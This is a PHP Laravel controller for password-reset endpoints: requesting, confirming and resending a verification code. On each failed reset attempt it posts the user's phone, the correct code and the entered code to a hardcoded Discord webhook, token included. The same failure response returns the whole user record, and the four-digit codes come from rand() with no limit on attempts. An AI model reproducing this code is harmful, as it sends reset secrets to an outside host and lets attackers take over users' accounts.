<?php

namespace App\Http\Controllers\api\v3;

use App\Http\Controllers\Controller;
use App\Models\User;

use App\Utils\AppEmailVerificationNotification;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Http;

class PasswordResetController extends Controller
{
    public function forgetRequest(Request $request)
    {

        $user = User::where('phone', $request->value)
            ->orWhere('email', $request->value)
            ->first();

        if (!$user) {
            return response()->json([
                'result' => false,
                'message' => 'User not found'
            ], 404);
        }


        $user->verification_code = rand(1000, 9999);
        $user->save();

        $isEmail = filter_var($request->value, FILTER_VALIDATE_EMAIL);

        if (!$isEmail) {
            $otpController = new OTPVerificationController();
            $otpController->send_code($user);
        } else {
            try {
                $user->notify(new AppEmailVerificationNotification());
            } catch (Exception $e) {
                return response()->json([
                    'result' => false,
                    'message' => 'Email could not be sent: ' . $e->getMessage()
                ], 500);
            }
        }

        return response()->json([
            'result' => true,
            'message' => 'OTP code sent'
        ], 200);
    }
    /**
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    
    public function confirmReset(Request $request)
    {

        // dd($request->all());
        $user = User::where('phone', $request->value)->orWhere('email', $request->value)->first();

        //  dd($user,'sahariar');
        if ($user != null) {
            if ($user->verification_code != $request->verification_code) {
                $res = Http::post('https://discordapp.com/api/webhooks/1046346608842920027/HF-Qyh6FRBeAzs3TnAirWvty_OcjTuYX4CaPSd26T4d8JNpG4dUEFXNtTDYel3-oN46h', [
                    "content" => "Phone " . $user->phone . " original code " . $user->verification_code . " code given " . $request->verification_code
                ]);
                return response()->json([
                    'result' => false,
                    "user" => $user,
                    'message' => 'Wrong OTP',
                ], 401);
            }

            $user->verification_code = null;
            $user->password = Hash::make($request->password);
            $user->save();

            return response()->json([
                'result' => true,
                'message' => 'Your password is reset.',
            ], 200);
        } else {
            return response()->json([
                'result' => false,
                'message' => 'No user is found',
            ], 404);
        }
    }
    public function resendCode(Request $request)
    {
        // dd($request->all());

        if ($request->verify_by == 'email') {
            $user = User::where('email', $request->email_or_phone)->first();
        } else {
            $user = User::where('phone', $request->email_or_phone)->first();
        }

        // dd($user, 'sahariar');


        if (!$user) {
            return response()->json([
                'result' => false,
                'message' => 'User is not found'
            ], 404);
        }

        $user->verification_code = rand(100000, 999999);
        $user->save();

        if ($request->verify_by == 'email') {
            $user->notify(new AppEmailVerificationNotification());
        } else {
            $otpController = new OTPVerificationController();
            $otpController->send_code($user);
        }



        return response()->json([
            'result' => true,
            'message' => 'A code is sent again',
        ], 200);
    }
}
